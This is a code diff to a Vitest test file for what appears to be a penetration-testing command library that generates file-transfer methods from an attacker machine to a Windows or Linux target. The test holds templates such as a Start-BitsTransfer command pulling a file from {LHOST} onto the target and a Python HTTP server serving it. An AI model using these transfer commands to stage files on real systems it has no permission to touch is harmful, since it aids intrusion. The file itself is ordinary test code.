@@ -1,14 +1,11 @@
-import { afterEach, describe, expect, it } from 'vitest';
+import { describe, expect, it } from 'vitest';
 import { transferMethods, withToolsDirs } from '../../../engines/generators/transfer';
 import { BUILTIN_LIBRARY } from '../../../engines/library/data';
 import { FIELD_MANUAL_CARDS } from '../../../engines/library/data/fieldManual';
-import { getCards, getLibrary, setImported } from '../../../engines/library/store';
 import type { LibraryCommand } from '../../../engines/library/types';
 
 const win = () => transferMethods(FIELD_MANUAL_CARDS, BUILTIN_LIBRARY, 'windows');
 const lin = () => transferMethods(FIELD_MANUAL_CARDS, BUILTIN_LIBRARY, 'linux');
-
-afterEach(() => setImported({ commands: [], cards: [] }));
 
 describe('transferMethods', () => {
   it('HTTP group yields one method per target block sharing the serve block', () => {
@@ -50,14 +47,14 @@ describe('transferMethods', () => {
     expect(lin().find((m) => m.group === 'SSH')!.target).toEqual([]);
   });
 
-  it('imported transfer cards override the built-ins', () => {
-    const serve = getLibrary().find((c) => c.id === 'fm-shell-file-transfer-to-windows-1')!;
+  it('the methods follow the library passed in: a changed serve block, an extra fetch', () => {
+    const serve = BUILTIN_LIBRARY.find((c) => c.id === 'fm-shell-file-transfer-to-windows-1')!;
     const extra: LibraryCommand = {
       id: 'fm-shell-file-transfer-to-windows-v99', title: 'Pull with bits', tool: 'Start-BitsTransfer', template: 'Start-BitsTransfer http://{LHOST}/{FILE} -Destination {DEST_DIR}',
       os: 'windows', runFrom: 'target', goals: [], source: 'field-manual', cardId: 'shell-file-transfer-to-windows', tags: ['group:HTTP (default)'],
     };
-    setImported({ commands: [{ ...serve, template: 'cd /opt/w && python3 -m http.server 8080' }, extra], cards: [] });
-    const http = transferMethods(getCards(), getLibrary(), 'windows').filter((m) => m.group === 'HTTP (default)');
+    const library = [...BUILTIN_LIBRARY.map((c) => (c.id === serve.id ? { ...serve, template: 'cd /opt/w && python3 -m http.server 8080' } : c)), extra];
+    const http = transferMethods(FIELD_MANUAL_CARDS, library, 'windows').filter((m) => m.group === 'HTTP (default)');
     expect(http).toHaveLength(8);
     expect(http[0]!.kali[0]!.template).toBe('cd /opt/w && python3 -m http.server 8080');
     expect(http[7]!.target[0]!.template).toContain('Start-BitsTransfer');
